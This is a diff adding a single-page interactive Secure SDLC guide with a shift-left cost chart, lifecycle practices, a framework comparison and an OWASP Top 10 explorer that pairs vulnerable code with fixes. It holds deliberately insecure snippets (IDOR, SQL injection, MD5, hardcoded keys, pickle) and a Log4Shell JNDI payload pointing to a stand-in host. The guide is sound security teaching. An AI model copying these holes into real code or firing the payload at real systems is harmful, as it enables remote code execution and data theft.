@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Interactive Secure SDLC Guide</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Chosen Palette: Slate & Cyan -->
+    <!-- Application Structure Plan: The SPA is designed as an interactive, single-page guide with persistent sidebar navigation. The structure is thematic, not linear, to improve usability. It starts with the "Why" (The Imperative), then moves to the core "How" with an interactive lifecycle diagram (Design, Code, Test), where clicking each stage reveals detailed content (Threat Modeling, SAST, Pen Testing). A dedicated, highly interactive "OWASP Vulnerability Explorer" section allows users to select a vulnerability and then toggle between language-specific code examples. The app concludes with "Frameworks & Culture." This task-oriented design allows users—from managers to developers—to either follow a learning path or quickly access specific, actionable information, which is more effective than a static document. -->
+    <!-- Visualization & Content Choices: 
+        - Remediation Cost: Report Info -> Cost of fixing bugs rises over time. Goal -> Inform/Impact. Viz/Method -> Bar Chart. Interaction -> Hover tooltips. Justification -> Visually demonstrates the core "shift-left" financial benefit. Library/Method -> Chart.js.
+        - SSDLC Phases: Report Info -> Different security activities per phase. Goal -> Organize. Viz/Method -> Interactive HTML/CSS diagram. Interaction -> Clicking a phase highlights it and reveals detailed content below. Justification -> Creates an intuitive, central navigation hub for the core SSDLC practices. Library/Method -> HTML/CSS/JS.
+        - OWASP Vulnerabilities: Report Info -> Detailed explanations and code for Top 10. Goal -> Organize/Inform. Viz/Method -> Nested tabbed interface. Interaction -> Users select a vulnerability, then select a language (Python/Java/Node.js) to see vulnerable vs. secure code. Justification -> Prevents overwhelming users with a massive wall of text and code, allowing focused exploration of relevant examples. Library/Method -> HTML/CSS/JS.
+        - Framework Comparison: Report Info -> Table comparing SDL, SAMM, BSIMM. Goal -> Compare. Viz/Method -> Styled HTML table. Interaction -> None. Justification -> A table is the clearest way to present this comparative data; styling improves readability. Library/Method -> Tailwind CSS.
+    -->
+    <!-- CONFIRMATION: NO SVG graphics used. NO Mermaid JS used. -->
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f8fafc; /* slate-50 */
+            color: #334155; /* slate-700 */
+        }
+        .nav-link {
+            transition: all 0.2s ease-in-out;
+            border-left: 3px solid transparent;
+        }
+        .nav-link.active {
+            color: #0891b2; /* cyan-600 */
+            border-left-color: #0891b2; /* cyan-600 */
+            background-color: #ecfeff; /* cyan-50 */
+        }
+        .nav-link:hover {
+            color: #0e7490; /* cyan-700 */
+            background-color: #ecfeff; /* cyan-50 */
+        }
+        .section-card {
+            background-color: white;
+            border-radius: 0.75rem;
+            box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
+        }
+        .tab-button.active {
+            background-color: #0891b2; /* cyan-600 */
+            color: white;
+        }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .lifecycle-phase {
+            cursor: pointer;
+            transition: all 0.3s ease-in-out;
+            border-bottom: 4px solid transparent;
+        }
+        .lifecycle-phase.active {
+            border-bottom-color: #0891b2; /* cyan-600 */
+            transform: translateY(-5px);
+        }
+        .code-block {
+            background-color: #f1f5f9; /* slate-100 */
+            border-radius: 0.5rem;
+            padding: 1rem;
+            overflow-x: auto;
+        }
+        .code-block-vulnerable { border-left: 4px solid #ef4444; /* red-500 */ }
+        .code-block-secure { border-left: 4px solid #22c55e; /* green-500 */ }
+        .chart-container {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            height: 300px;
+            max-height: 400px;
+        }
+        @media (min-width: 768px) { .chart-container { height: 350px; } }
+    </style>
+</head>
+<body>
+    <div class="flex min-h-screen">
+        <aside class="w-64 bg-white shadow-md fixed top-0 left-0 h-full hidden lg:block">
+            <div class="p-6">
+                <h2 class="text-xl font-bold text-slate-800">Secure SDLC Guide</h2>
+                <p class="text-xs text-slate-500 mt-1">An Interactive Blueprint</p>
+            </div>
+            <nav id="desktop-nav" class="mt-4">
+                <a href="#imperative" class="nav-link block py-3 px-6 font-medium text-slate-600">The Imperative</a>
+                <a href="#lifecycle" class="nav-link block py-3 px-6 font-medium text-slate-600">The Lifecycle</a>
+                <a href="#owasp" class="nav-link block py-3 px-6 font-medium text-slate-600">OWASP Explorer</a>
+                <a href="#frameworks" class="nav-link block py-3 px-6 font-medium text-slate-600">Frameworks & Culture</a>
+                <a href="#roadmap" class="nav-link block py-3 px-6 font-medium text-slate-600">Adoption Roadmap</a>
+            </nav>
+        </aside>
+
+        <main class="flex-1 lg:ml-64 p-4 sm:p-6 md:p-8">
+            <header class="lg:hidden mb-6">
+                 <h1 class="text-3xl font-bold text-slate-800">Secure SDLC Guide</h1>
+                 <p class="text-slate-500 mt-1">An Interactive Blueprint</p>
+            </header>
+
+            <section id="imperative" class="mb-16">
+                <h2 class="text-3xl font-bold text-slate-800 mb-4">The Strategic Imperative for Security</h2>
+                <p class="text-lg text-slate-600 mb-8">The Secure Software Development Lifecycle (SSDLC) is a paradigm shift from viewing security as a final hurdle to embedding it into the very fabric of development. This proactive "shift-left" approach treats security as a shared responsibility, integrating tools and processes from day one. This section explores why this is not just a technical best practice, but a critical business strategy that reduces costs, manages risk, and ultimately enables faster, safer delivery of software.</p>
+                <div class="section-card p-6">
+                    <h3 class="font-bold text-xl text-cyan-700 mb-2 text-center">The Economics of "Shifting Left"</h3>
+                    <p class="text-slate-600 mb-4 text-center">Finding and fixing a security vulnerability in production is exponentially more expensive than addressing it during the design phase. This chart illustrates the dramatic cost increase, making a clear case for early detection.</p>
+                    <div class="chart-container">
+                        <canvas id="costChart"></canvas>
+                    </div>
+                </div>
+            </section>
+
+            <section id="lifecycle" class="mb-16">
+                <h2 class="text-3xl font-bold text-slate-800 mb-4">The Secure Lifecycle in Practice</h2>
+                <p class="text-lg text-slate-600 mb-8">An effective SSDLC integrates specific security activities into each phase of development. This creates a multi-layered defense where vulnerabilities are systematically identified and eliminated. Click on each phase below to explore the key security practices, from architectural analysis in the Design phase to automated scanning in Code and simulated attacks in Test.</p>
+                
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-center mb-8">
+                    <div id="phase-design" class="lifecycle-phase section-card p-6">
+                        <span class="text-4xl">🎨</span>
+                        <h3 class="text-xl font-bold mt-2 text-slate-800">1. Secure Design</h3>
+                        <p class="text-sm text-slate-500">Threat Modeling</p>
+                    </div>
+                    <div id="phase-code" class="lifecycle-phase section-card p-6">
+                        <span class="text-4xl">💻</span>
+                        <h3 class="text-xl font-bold mt-2 text-slate-800">2. Secure Code</h3>
+                        <p class="text-sm text-slate-500">Static Analysis (SAST)</p>
+                    </div>
+                    <div id="phase-test" class="lifecycle-phase section-card p-6">
+                        <span class="text-4xl">🛡️</span>
+                        <h3 class="text-xl font-bold mt-2 text-slate-800">3. Secure Test</h3>
+                        <p class="text-sm text-slate-500">Penetration Testing</p>
+                    </div>
+                </div>
+
+                <div id="lifecycle-content-area" class="space-y-8">
+                    <!-- Content will be injected here by JS -->
+                </div>
+            </section>
+
+            <section id="owasp" class="mb-16">
+                <h2 class="text-3xl font-bold text-slate-800 mb-4">OWASP Top 10 Vulnerability Explorer</h2>
+                <p class="text-lg text-slate-600 mb-8">The OWASP Top 10 is a critical guide to the most prevalent web application security risks. This interactive explorer allows you to dive into the details of each vulnerability. Select a risk from the dropdown to learn about it, then use the tabs to see concrete, language-specific examples of both vulnerable code and its secure mitigation.</p>
+                
+                <div class="section-card p-6">
+                    <div class="mb-4">
+                        <label for="owasp-select" class="block text-sm font-medium text-slate-700 mb-1">Select a Vulnerability:</label>
+                        <select id="owasp-select" class="w-full p-2 border border-slate-300 rounded-md shadow-sm focus:ring-cyan-500 focus:border-cyan-500">
+                            <option value="a01">A01:2021 – Broken Access Control</option>
+                            <option value="a02">A02:2021 – Cryptographic Failures</option>
+                            <option value="a03">A03:2021 – Injection</option>
+                            <option value="a06">A06:2021 – Vulnerable and Outdated Components</option>
+                            <option value="a08">A08:2021 – Software and Data Integrity Failures</option>
+                        </select>
+                    </div>
+
+                    <div id="owasp-details" class="mt-4">
+                        <!-- OWASP content injected here -->
+                    </div>
+                </div>
+            </section>
+
+            <section id="frameworks" class="mb-16">
+                <h2 class="text-3xl font-bold text-slate-800 mb-4">Frameworks & Culture</h2>
+                <p class="text-lg text-slate-600 mb-8">Implementing an SSDLC requires both a structural framework and a cultural shift. A framework like Microsoft's SDL, OWASP SAMM, or BSIMM provides the roadmap, while fostering a security-first culture ensures the journey is successful. This section compares the leading frameworks and discusses the human element of building a truly secure engineering organization.</p>
+                <div class="section-card p-6">
+                    <h3 class="font-bold text-xl text-cyan-700 mb-4">Comparing SSDLC Maturity Models</h3>
+                    <div class="overflow-x-auto">
+                        <table class="min-w-full divide-y divide-slate-200">
+                            <thead class="bg-slate-50">
+                                <tr>
+                                    <th class="px-6 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">Attribute</th>
+                                    <th class="px-6 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">Microsoft SDL</th>
+                                    <th class="px-6 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">OWASP SAMM</th>
+                                    <th class="px-6 py-3 text-left text-xs font-medium text-slate-500 uppercase tracking-wider">BSIMM</th>
+                                </tr>
+                            </thead>
+                            <tbody class="bg-white divide-y divide-slate-200">
+                                <tr><td class="px-6 py-4 font-semibold">Nature</td><td class="px-6 py-4">Prescriptive</td><td class="px-6 py-4">Prescriptive</td><td class="px-6 py-4">Descriptive</td></tr>
+                                <tr><td class="px-6 py-4 font-semibold">Primary Goal</td><td class="px-6 py-4 text-sm">Provide a strict, repeatable process.</td><td class="px-6 py-4 text-sm">Provide a flexible, measurable improvement framework.</td><td class="px-6 py-4 text-sm">Provide a data-driven benchmark against peers.</td></tr>
+                                <tr><td class="px-6 py-4 font-semibold">Ideal Profile</td><td class="px-6 py-4 text-sm">Large, process-driven organizations.</td><td class="px-6 py-4 text-sm">Organizations of any size, especially agile ones.</td><td class="px-6 py-4 text-sm">Mature organizations seeking to refine their program.</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <section id="roadmap" class="mb-16">
+                <h2 class="text-3xl font-bold text-slate-800 mb-4">Actionable Adoption Roadmap</h2>
+                <p class="text-lg text-slate-600 mb-8">Adopting an SSDLC is a journey, not a destination. A phased, iterative approach allows an organization to build momentum and demonstrate value at each step. Below is a sample roadmap for a successful implementation, moving from foundational education to mature, data-driven security practices.</p>
+                <div class="space-y-8">
+                    <div class="section-card p-6 flex items-start gap-4">
+                        <div class="flex-shrink-0 bg-cyan-100 text-cyan-700 font-bold rounded-full h-12 w-12 flex items-center justify-center">1</div>
+                        <div>
+                            <h3 class="font-bold text-lg">Phase 1: Assess and Educate (Months 1-3)</h3>
+                            <p class="mt-1 text-slate-600">Conduct a gap analysis using a framework like SAMM. Provide foundational security training (e.g., OWASP Top 10) to all engineering staff.</p>
+                        </div>
+                    </div>
+                    <div class="section-card p-6 flex items-start gap-4">
+                        <div class="flex-shrink-0 bg-cyan-100 text-cyan-700 font-bold rounded-full h-12 w-12 flex items-center justify-center">2</div>
+                        <div>
+                            <h3 class="font-bold text-lg">Phase 2: Integrate and Automate (Months 4-9)</h3>
+                            <p class="mt-1 text-slate-600">Introduce threat modeling for new projects. Integrate SAST and Software Composition Analysis (SCA) into the CI/CD pipeline with carefully tuned quality gates.</p>
+                        </div>
+                    </div>
+                    <div class="section-card p-6 flex items-start gap-4">
+                        <div class="flex-shrink-0 bg-cyan-100 text-cyan-700 font-bold rounded-full h-12 w-12 flex items-center justify-center">3</div>
+                        <div>
+                            <h3 class="font-bold text-lg">Phase 3: Mature and Measure (Months 10+)</h3>
+                            <p class="mt-1 text-slate-600">Expand threat modeling to existing systems. Introduce Dynamic Application Security Testing (DAST) and schedule external penetration tests. Track KPIs like Mean-Time-to-Remediate (MTTR).</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    
+    const lifecycleContent = {
+        design: `
+            <div class="section-card p-6">
+                <h3 class="text-2xl font-bold text-cyan-700 mb-3">Secure Design: Threat Modeling</h3>
+                <p class="mb-4">Threat modeling is a structured process to proactively identify architectural vulnerabilities before code is written. By decomposing an application and analyzing it through a framework like STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege), teams can build security into the design itself.</p>
+                <h4 class="font-semibold mb-2">Practical Walkthrough: User Profile API</h4>
+                <ul class="list-disc list-inside space-y-2 text-slate-600">
+                    <li><b>Threat: Information Disclosure</b> - API returns the entire user object, leaking password hashes.</li>
+                    <li><b>Mitigation:</b> Use Data Transfer Objects (DTOs) to return only necessary, non-sensitive data.</li>
+                    <li><b>Threat: Broken Access Control</b> - A user can request another user's profile by changing the ID in the URL.</li>
+                    <li><b>Mitigation:</b> Enforce server-side checks to verify the authenticated user's ID matches the requested resource ID.</li>
+                </ul>
+            </div>`,
+        code: `
+            <div class="section-card p-6">
+                <h3 class="text-2xl font-bold text-cyan-700 mb-3">Secure Code: Static Analysis (SAST)</h3>
+                <p class="mb-4">Static Application Security Testing (SAST) tools automatically scan source code to find security flaws. Integrating SAST into the CI/CD pipeline provides immediate feedback to developers, allowing them to fix issues in real-time. This is a cornerstone of the "shift-left" philosophy.</p>
+                <h4 class="font-semibold mb-2">Integration Best Practices</h4>
+                <ul class="list-disc list-inside space-y-2 text-slate-600">
+                    <li><b>Automate Scans:</b> Run on every pull/merge request to catch issues early.</li>
+                    <li><b>Use Quality Gates:</b> Automatically fail builds for new, high-severity vulnerabilities.</li>
+                    <li><b>Tune Rules:</b> Customize rules to reduce false positives and maintain developer trust.</li>
+                    <li><b>Integrate Feedback:</b> Deliver results directly into the developer's workflow (e.g., IDE or pull request comments).</li>
+                </ul>
+            </div>`,
+        test: `
+            <div class="section-card p-6">
+                <h3 class="text-2xl font-bold text-cyan-700 mb-3">Secure Test: Penetration Testing</h3>
+                <p class="mb-4">Penetration testing provides a final, human-driven validation of an application's security. Ethical hackers simulate real-world attacks to find complex business logic flaws and vulnerabilities that automated tools might miss. It's a critical step before deployment.</p>
+                <h4 class="font-semibold mb-2">Testing Methodologies</h4>
+                <ul class="list-disc list-inside space-y-2 text-slate-600">
+                    <li><b>Black-Box:</b> Tester has no prior knowledge. Simulates an external attacker.</li>
+                    <li><b>White-Box:</b> Tester has full access to source code and architecture. Provides the most thorough coverage.</li>
+                    <li><b>Gray-Box:</b> Tester has limited knowledge (e.g., a standard user account). Simulates an insider threat.</li>
+                </ul>
+            </div>`
+    };
+
+    const owaspData = {
+        a01: {
+            title: "A01:2021 – Broken Access Control",
+            desc: "Occurs when an application fails to properly enforce policies that restrict what authenticated users are allowed to do. This allows attackers to access unauthorized data or execute privileged functions.",
+            langs: {
+                python: {
+                    vuln: `
+# Vulnerable (Flask IDOR)
+@app.route('/user/<user_id>')
+def get_user_profile(user_id):
+  # No check to see if logged-in user
+  # is the one being requested.
+  user = users.get(user_id)
+  return jsonify(user)`,
+                    secure: `
+# Secure (Flask IDOR)
+@app.route('/user/<user_id>')
+def get_user_profile(user_id):
+  # Check if logged-in user's ID
+  # matches the requested user_id.
+  if session.get('user_id') != user_id:
+    abort(403) # Forbidden
+  user = users.get(user_id)
+  return jsonify(user)`
+                },
+                java: {
+                    vuln: `
+// Vulnerable (Spring)
+@GetMapping("/admin/dashboard")
+public String getAdminDashboard() {
+  // No role check is performed.
+  // Any authenticated user can access.
+  return "Admin Dashboard";
+}`,
+                    secure: `
+// Secure (Spring)
+@GetMapping("/admin/dashboard")
+@PreAuthorize("hasRole('ADMIN')")
+public String getAdminDashboard() {
+  // Enforces role-based access.
+  return "Admin Dashboard";
+}`
+                },
+                nodejs: {
+                    vuln: `
+// Vulnerable (Express)
+app.put('/profile/update', (req, res) => {
+  // Trusts userId from request body.
+  const { userId, newEmail } = req.body;
+  updateUserEmailInDb(userId, newEmail);
+  res.send('Updated.');
+});`,
+                    secure: `
+// Secure (Express)
+app.put('/profile/update', (req, res) => {
+  // Uses authenticated user's ID from
+  // session/token, ignores body.
+  const userId = req.user.id;
+  const { newEmail } = req.body;
+  updateUserEmailInDb(userId, newEmail);
+  res.send('Updated.');
+});`
+                }
+            }
+        },
+        a02: {
+            title: "A02:2021 – Cryptographic Failures",
+            desc: "Focuses on failures related to cryptography, which can lead to the exposure of sensitive data. Common issues include using weak algorithms, hardcoding keys, or using unsalted password hashes.",
+            langs: {
+                python: { vuln: `
+# Vulnerable (Weak Hashing)
+import hashlib
+# Using MD5 is insecure.
+hashed = hashlib.md5(pwd.encode())`, 
+                           secure: `
+# Secure (Strong Hashing)
+import bcrypt
+# bcrypt is adaptive and salted.
+salt = bcrypt.gensalt()
+hashed = bcrypt.hashpw(pwd.encode(), salt)` },
+                java: { vuln: `
+// Vulnerable (Hardcoded Key)
+String key = "thisIsASecretKey";
+SecretKeySpec secretKey = 
+  new SecretKeySpec(key.getBytes(), "AES");`, 
+                        secure: `
+// Secure (Key from KMS)
+// Key should be retrieved from a
+// secure Key Management System (KMS)
+// at runtime, never hardcoded.
+SecretKey key = getEncryptionKeyFromKMS();` },
+                nodejs: { vuln: `
+// Vulnerable (Weak Algorithm)
+const algorithm = 'des-cbc';
+const key = 'a1b2c3d4';
+const iv = Buffer.alloc(8, Math.random());`, 
+                          secure: `
+// Secure (Strong Algorithm)
+const algorithm = 'aes-256-gcm';
+const key = crypto.randomBytes(32);
+const iv = crypto.randomBytes(16);` }
+            }
+        },
+        a03: {
+            title: "A03:2021 – Injection",
+            desc: "Occurs when untrusted data is sent to an interpreter as part of a command or query. This allows an attacker to execute unintended commands, such as in SQL Injection (SQLi).",
+            langs: {
+                python: { vuln: `
+# Vulnerable (SQLi)
+query = text(f"SELECT * FROM users WHERE name = '{username}'")
+conn.execute(query)`, 
+                           secure: `
+# Secure (Parameterized Query)
+query = text("SELECT * FROM users WHERE name = :name")
+conn.execute(query, {"name": username})` },
+                java: { vuln: `
+// Vulnerable (HQL Injection)
+String hql = "FROM User u WHERE u.name = '" + userName + "'";
+session.createQuery(hql);`, 
+                        secure: `
+// Secure (Parameterized Query)
+String hql = "FROM User u WHERE u.name = :name";
+Query q = session.createQuery(hql);
+q.setParameter("name", userName);` },
+                nodejs: { vuln: `
+// Vulnerable (SQLi)
+sequelize.query(
+  \`SELECT * FROM users WHERE name = '\${username}'\`
+)`, 
+                          secure: `
+// Secure (Replacements)
+sequelize.query(
+  'SELECT * FROM users WHERE name = :user',
+  { replacements: { user: username } }
+)` }
+            }
+        },
+        a06: {
+            title: "A06:2021 – Vulnerable and Outdated Components",
+            desc: "Arises from using third-party libraries, frameworks, or other software components with known security vulnerabilities (CVEs). Attackers actively scan for these to find easy targets.",
+            langs: {
+                python: { vuln: `
+# requirements.txt
+requests==2.24.0 
+# This version has known vulns.`, 
+                           secure: `
+# CI/CD Step
+pip install pip-audit
+pip-audit -r requirements.txt
+# Automate scanning to find and
+# force updates.` },
+                java: { vuln: `
+<!-- pom.xml -->
+<dependency>
+  <groupId>log4j</groupId>
+  <artifactId>log4j</artifactId>
+  <version>1.2.17</version>
+</dependency>`, 
+                        secure: `
+<!-- pom.xml plugin -->
+<plugin>
+  <groupId>org.owasp</groupId>
+  <artifactId>dependency-check-maven</artifactId>
+  <configuration>
+    <failBuildOnCVSS>8</failBuildOnCVSS>
+  </configuration>
+</plugin>` },
+                nodejs: { vuln: `
+// package.json
+{
+  "dependencies": {
+    "lodash": "4.17.15"
+  }
+}`, 
+                          secure: `
+# CI/CD Step
+# Fails build on high-sev vulns
+npm audit --audit-level=high` }
+            }
+        },
+        a08: {
+            title: "A08:2021 – Software and Data Integrity Failures",
+            desc: "Focuses on vulnerabilities related to the software supply chain, such as insecure CI/CD pipelines or insecure deserialization of user-controlled data, which can lead to remote code execution.",
+            langs: {
+                python: { vuln: `
+# Vulnerable (Insecure Deserialization)
+import pickle
+# Deserializing untrusted data can
+# lead to remote code execution.
+profile = pickle.loads(user_data)`, 
+                           secure: `
+# Secure (Safe Data Format)
+import json
+# Use a safe, data-only format
+# like JSON for untrusted data.
+profile = json.loads(user_data)` },
+                java: { vuln: `
+// Vulnerable (Log4Shell)
+// A vulnerable version of Log4j
+// allows an attacker to execute code
+// via a crafted JNDI lookup string.
+LOGGER.error("\${jndi:ldap://a.com/x}");`, 
+                        secure: `
+// Mitigation
+// 1. Use SCA to find vulnerable libs.
+// 2. Update Log4j to a patched version.
+// 3. Use a WAF to block malicious
+//    JNDI strings.` },
+                nodejs: { vuln: `
+// Vulnerable (Supply Chain Attack)
+// The event-stream npm package was
+// hijacked to include malicious code
+// that stole cryptocurrency wallets.`, 
+                          secure: `
+// Mitigation
+// 1. Use lockfiles (package-lock.json)
+//    to ensure repeatable builds.
+// 2. Vendor critical dependencies.
+// 3. Use SCA tools to scan for
+//    suspicious packages.` }
+            }
+        }
+    };
+
+
+    const sections = document.querySelectorAll('main section');
+    const navLinks = document.querySelectorAll('#desktop-nav a');
+    const lifecyclePhases = document.querySelectorAll('.lifecycle-phase');
+    const lifecycleContentArea = document.getElementById('lifecycle-content-area');
+    const owaspSelect = document.getElementById('owasp-select');
+    const owaspDetailsContainer = document.getElementById('owasp-details');
+
+    function updateActiveNavLink() {
+        let currentSection = '';
+        sections.forEach(section => {
+            const sectionTop = section.offsetTop;
+            if (window.pageYOffset >= sectionTop - 100) {
+                currentSection = section.getAttribute('id');
+            }
+        });
+
+        navLinks.forEach(link => {
+            link.classList.remove('active');
+            if (link.getAttribute('href') === `#${currentSection}`) {
+                link.classList.add('active');
+            }
+        });
+    }
+
+    function handleLifecycleClick(phaseId) {
+        lifecyclePhases.forEach(p => p.classList.remove('active'));
+        document.getElementById(`phase-${phaseId}`).classList.add('active');
+        lifecycleContentArea.innerHTML = lifecycleContent[phaseId];
+    }
+
+    function renderOwaspContent(vulnId) {
+        const vuln = owaspData[vulnId];
+        if (!vuln) return;
+
+        const langButtons = Object.keys(vuln.langs).map((lang, index) => 
+            `<button class="tab-button owasp-lang-tab px-4 py-2 text-sm font-medium rounded-md bg-slate-200 text-slate-700 ${index === 0 ? 'active' : ''}" data-lang="${lang}">${lang.charAt(0).toUpperCase() + lang.slice(1)}</button>`
+        ).join('');
+
+        const langContents = Object.entries(vuln.langs).map(([lang, content], index) => `
+            <div id="owasp-lang-${lang}" class="tab-content owasp-lang-content ${index === 0 ? 'active' : ''} mt-4">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div>
+                        <h4 class="font-semibold mb-2 text-red-600">Vulnerable Code</h4>
+                        <pre class="code-block code-block-vulnerable"><code>${content.vuln.trim()}</code></pre>
+                    </div>
+                    <div>
+                        <h4 class="font-semibold mb-2 text-green-600">Secure Mitigation</h4>
+                        <pre class="code-block code-block-secure"><code>${content.secure.trim()}</code></pre>
+                    </div>
+                </div>
+            </div>
+        `).join('');
+
+        owaspDetailsContainer.innerHTML = `
+            <h3 class="text-xl font-bold text-cyan-700">${vuln.title}</h3>
+            <p class="mt-2 mb-4 text-slate-600">${vuln.desc}</p>
+            <div class="border-b border-slate-200">
+                <div class="flex flex-wrap gap-2 -mb-px">
+                    ${langButtons}
+                </div>
+            </div>
+            <div>${langContents}</div>
+        `;
+        
+        addOwaspLangTabListeners();
+    }
+    
+    function addOwaspLangTabListeners() {
+        const langTabs = document.querySelectorAll('.owasp-lang-tab');
+        const langContents = document.querySelectorAll('.owasp-lang-content');
+        langTabs.forEach(button => {
+            button.addEventListener('click', () => {
+                const lang = button.dataset.lang;
+                langTabs.forEach(btn => btn.classList.remove('active'));
+                button.classList.add('active');
+                langContents.forEach(content => {
+                    content.classList.remove('active');
+                    if(content.id === `owasp-lang-${lang}`) {
+                        content.classList.add('active');
+                    }
+                });
+            });
+        });
+    }
+
+    window.addEventListener('scroll', updateActiveNavLink);
+    
+    lifecyclePhases.forEach(phase => {
+        phase.addEventListener('click', () => handleLifecycleClick(phase.id.split('-')[1]));
+    });
+
+    owaspSelect.addEventListener('change', (e) => renderOwaspContent(e.target.value));
+
+    // Initial state
+    updateActiveNavLink();
+    handleLifecycleClick('design');
+    renderOwaspContent(owaspSelect.value);
+
+    // Chart.js implementation
+    const costCtx = document.getElementById('costChart').getContext('2d');
+    new Chart(costCtx, {
+        type: 'bar',
+        data: {
+            labels: ['Design', 'Implementation', 'Testing', 'Production'],
+            datasets: [{
+                label: 'Relative Cost to Fix',
+                data: [1, 6.5, 15, 100],
+                backgroundColor: 'rgba(22, 163, 74, 0.6)', /* green-600 */
+                borderColor: 'rgba(21, 128, 61, 1)', /* green-700 */
+                borderWidth: 1
+            }]
+        },
+        options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            plugins: {
+                legend: { display: false },
+                title: { display: true, text: 'Relative Cost of Fixing Vulnerabilities by Phase' },
+                tooltip: {
+                    callbacks: {
+                        label: function(context) {
+                            return `Cost: ${context.raw}x`;
+                        }
+                    }
+                }
+            },
+            scales: {
+                y: {
+                    beginAtZero: true,
+                    title: { display: true, text: 'Cost Multiplier (x)' }
+                }
+            }
+        }
+    });
+});
+</script>
+</body>
+</html>
